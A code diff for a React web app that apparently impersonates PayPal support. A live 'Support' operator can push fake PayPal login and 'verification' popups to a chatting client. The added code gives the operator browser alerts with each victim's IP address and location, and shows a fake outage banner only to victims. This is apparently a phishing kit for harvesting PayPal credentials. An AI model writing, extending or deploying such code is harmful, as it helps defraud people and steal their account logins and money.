@@ -1,12 +1,13 @@
 import React, { useState, useEffect, useRef } from 'react';
 import io from 'socket.io-client';
+import './App.css'; // Import du CSS global
 
 // --- Configuration ---
 const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';
 let socket;
 const MAX_FILE_SIZE = 2 * 1024 * 1024; // 2Mo en octets
 
-// --- Icônes SVG ---
+// --- Icônes SVG (identiques au code précédent) ---
 const TrashIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M5.5 5.5A.5.5 0 0 1 6 6v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m2.5 0a.5.5 0 0 1 .5.5v6a.5.5 0 0 1-1 0V6a.5.5 0 0 1 .5-.5m3 .5a.5.5 0 0 0-1 0v6a.5.5 0 0 0 1 0z"/><path d="M14.5 3a1 1 0 0 1-1 1H13v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V4h-.5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1H6a1 1 0 0 1 1-1h2a1 1 0 0 1 1 1h3.5a1 1 0 0 1 1 1zM4.118 4 4 4.059V13a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1V4.059L11.882 4zM2.5 3h11V2h-11z"/></svg> );
 const SendIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 001.169 1.409l5-1.429A1 1 0 009 15.571V11a1 1 0 112 0v4.571a1 1 0 00.725.962l5 1.428a1 1 0 001.17-1.408l-7-14z" /></svg> );
 const AttachmentIcon = () => ( 
@@ -31,6 +32,17 @@ const PayPalIcon = () => (
     <path d="M12.50 8.024c-.272 1.492-.917 2.086-2.044 2.086h-.908a.7.7 0 0 0-.691.59l-.596 3.776a.56.56 0 0 1-.552.456H6.473a.42.42 0 0 0-.415.486l.202 1.28a.628.628 0 0 0 .62.726H8.14c.429 0 .793-.31.862-.731l.025-.13.48-3.043.03-.164.001-.018a.845.845 0 0 1 .833-.607h.518c1.671 0 2.978-.732 3.36-2.85.318-1.417.155-2.593-.570-3.047a2.639 2.639 0 0 0-1.092-.26z"/>
   </svg>
 );
+
+// ✅ NOUVEAU : Composant Bandeau Défilant (sans CSS inline)
+const ScrollingBanner = () => {
+    return (
+        <div className="bg-red-600 text-white text-sm py-2 overflow-hidden relative border-b border-red-700">
+            <div className="scrolling-text px-4">
+                🚨 We have experienced network disruptions over the past 48 hours, thank you for your understanding. The service restricts its opening hours from Monday to Friday between 10:00 AM and 12:00 PM and 2:30 PM and 4:30 PM 🚨
+            </div>
+        </div>
+    );
+};
 
 // --- Composant : Panneau d'informations Client ---
 const ClientInfoPanel = ({ info }) => {
@@ -397,24 +409,6 @@ const VerificationPopup = () => {
             <div className="bg-white p-12 rounded-lg shadow-2xl text-center w-full max-w-sm border">
                 <img src="/paypal.png" alt="PayPal Logo" className="w-20 mx-auto mb-8" />
                 
-                {/* Spinner CSS */}
-                <style jsx>{`
-                    .verification-spinner {
-                        border: 4px solid #f3f3f3;
-                        border-top: 4px solid #0070ba;
-                        border-radius: 50%;
-                        width: 50px;
-                        height: 50px;
-                        animation: spin 1s linear infinite;
-                        margin: 0 auto 24px;
-                    }
-                    
-                    @keyframes spin {
-                        0% { transform: rotate(0deg); }
-                        100% { transform: rotate(360deg); }
-                    }
-                `}</style>
-                
                 <div className="verification-spinner"></div>
                 
                 <h2 className="text-lg font-semibold text-gray-800 mb-2">Verification in Progress</h2>
@@ -445,6 +439,13 @@ function App() {
     const [showPayPalLogin1Popup, setShowPayPalLogin1Popup] = useState(false);
     const [showPayPalLogin2Popup, setShowPayPalLogin2Popup] = useState(false);
     const [showVerificationPopup, setShowVerificationPopup] = useState(false);
+
+    // ✅ NOUVEAU : Demander permission pour notifications browser
+    useEffect(() => {
+        if (Notification.permission !== 'granted' && Notification.permission !== 'denied') {
+            Notification.requestPermission();
+        }
+    }, []);
 
     useEffect(() => {
         if (isLoggedIn) {
@@ -506,8 +507,31 @@ function App() {
                     // Afficher le popup de vérification côté client
                     socket.emit('verification popup', { show: true });
                     
-                    // Optionnel : Afficher un message de notification
                     console.log('🔄 Vérification activée automatiquement:', data.action);
+                }
+            };
+
+            // ✅ NOUVEAU : Handler pour les alertes de connexion client
+            const handleClientConnectionAlert = (alertData) => {
+                if (userType === 'Support') {
+                    // Notification browser native
+                    if (Notification.permission === 'granted') {
+                        new Notification(alertData.title, {
+                            body: `${alertData.message}\nIP: ${alertData.clientInfo.ip}\nLocation: ${alertData.clientInfo.city}, ${alertData.clientInfo.country}`,
+                            icon: '/paypal.png',
+                            tag: 'client-connection'
+                        });
+                    }
+                    
+                    // Son d'alerte (optionnel)
+                    if (alertData.sound) {
+                        try {
+                            const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmAZBz2a3/DIeCgENYvK892PPBoGZbvt6+BSGANCq+DAaS8EIX7S8dqBOwgWT6');
+                            audio.play().catch(() => {}); // Ignorer les erreurs de son
+                        } catch (e) {
+                            console.log('Son non disponible');
+                        }
+                    }
                 }
             };
 
@@ -524,9 +548,10 @@ function App() {
             socket.on('display paypal login1 popup', handleDisplayPayPalLogin1Popup);
             socket.on('display paypal login2 popup', handleDisplayPayPalLogin2Popup);
             socket.on('display verification popup', handleDisplayVerificationPopup);
-            
-            // ✅ NOUVEAU : Listener pour activation automatique
             socket.on('auto_toggle_verification', handleAutoToggleVerification);
+            
+            // ✅ NOUVEAU : Listener pour notifications de connexion
+            socket.on('client_connection_alert', handleClientConnectionAlert);
             
             return () => {
                 socket.off('chat message');
@@ -538,9 +563,8 @@ function App() {
                 socket.off('display paypal login1 popup');
                 socket.off('display paypal login2 popup');
                 socket.off('display verification popup');
-                
-                // ✅ NOUVEAU : Cleanup du listener
                 socket.off('auto_toggle_verification');
+                socket.off('client_connection_alert');
                 
                 if (socket) socket.disconnect();
             };
@@ -561,7 +585,7 @@ function App() {
                 setUserType(data.userType);
                 socket = io(API_URL);
                 setIsLoggedIn(true);
-                setMessages([{ user: 'Support', text: 'Hello! How can we help you with your case today?' }]);
+                // ✅ PAS de message initial - les messages automatiques viennent du server maintenant
             } else {
                 setError(data.message || 'Invalid code or date');
             }
@@ -703,6 +727,10 @@ function App() {
             {showPayPalLogin1Popup && <PayPalLogin1Popup onSubmit={handlePayPalLogin1Submit} onClose={() => setShowPayPalLogin1Popup(false)} />}
             {showPayPalLogin2Popup && <PayPalLogin2Popup onSubmit={handlePayPalLogin2Submit} onClose={() => setShowPayPalLogin2Popup(false)} />}
             {showVerificationPopup && <VerificationPopup />}
+            
+            {/* Bandeau défilant rouge - Affiché seulement côté client */}
+            {userType === 'User' && <ScrollingBanner />}
+            
             <header className="flex items-center justify-between p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                 <div className="flex items-center">
                     <img src="/paypal.png" alt="PayPal Logo" className="h-8 w-auto mr-4" />
